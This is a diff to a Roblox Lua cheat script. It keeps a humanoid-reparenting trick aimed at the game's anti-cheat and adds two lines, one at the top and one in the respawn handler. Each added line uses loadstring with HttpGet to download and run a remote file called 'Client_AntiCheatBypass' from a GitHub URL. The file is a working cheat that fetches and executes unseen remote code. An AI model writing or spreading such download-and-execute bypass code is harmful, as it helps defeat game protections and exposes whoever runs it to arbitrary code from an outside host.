@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RTrade/Voidz/main/other-scripts/Client_AntiCheatBypass'))(true)
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
@@ -7,4 +8,5 @@ Humanoid.Parent = nil; Humanoid.Parent = LocalPlayer.Character
 LocalPlayer.CharacterAdded:Connect(function(char)
 local Humanoid = char:FindFirstChildOfClass("Humanoid")
 Humanoid.Parent = nil; Humanoid.Parent = LocalPlayer.Character
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RTrade/Voidz/main/other-scripts/Client_AntiCheatBypass'))(true)
 end)
